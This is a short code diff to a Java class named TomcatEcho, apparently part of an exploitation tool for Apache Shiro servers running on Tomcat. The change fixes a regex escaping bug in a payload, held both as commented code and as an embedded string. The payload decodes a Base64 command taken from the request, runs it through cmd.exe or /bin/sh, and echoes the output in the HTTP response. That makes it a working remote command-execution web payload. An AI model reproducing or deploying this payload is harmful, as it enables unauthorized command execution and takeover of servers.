@@ -87,7 +87,7 @@ public class TomcatEcho implements EchoPayload {
 //                                String var33 = org.apache.shiro.codec.Base64.decodeToString(var3);
 //                                var2.getClass().getMethod("setStatus", new Class[]{Integer.TYPE}).invoke(var2, new Object[]{new Integer(200)});
 //                                String[] var12 = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", var33} : new String[]{"/bin/sh", "-c", var33};
-//                                writeBody(var2, (new java.util.Scanner((new ProcessBuilder(var12)).start().getInputStream())).useDelimiter("\\\\A").next().getBytes());
+//                                writeBody(var2, (new java.util.Scanner((new ProcessBuilder(var12)).start().getInputStream())).useDelimiter("\\A").next().getBytes());
 //                                var4 = true;
 //                            }
 //
@@ -191,7 +191,7 @@ public class TomcatEcho implements EchoPayload {
                 "                                String var33 = org.apache.shiro.codec.Base64.decodeToString(var3);\n" +
                 "                                var2.getClass().getMethod(\"setStatus\", new Class[]{Integer.TYPE}).invoke(var2, new Object[]{new Integer(200)});\n" +
                 "                                String[] var12 = System.getProperty(\"os.name\").toLowerCase().contains(\"window\") ? new String[]{\"cmd.exe\", \"/c\", var33} : new String[]{\"/bin/sh\", \"-c\", var33};\n" +
-                "                                writeBody(var2, (new java.util.Scanner((new ProcessBuilder(var12)).start().getInputStream())).useDelimiter(\"\\\\\\\\A\").next().getBytes());\n" +
+                "                                writeBody(var2, (new java.util.Scanner((new ProcessBuilder(var12)).start().getInputStream())).useDelimiter(\"\\\\A\").next().getBytes());\n" +
                 "                                var4 = true;\n" +
                 "                            }\n" +
                 "\n" +
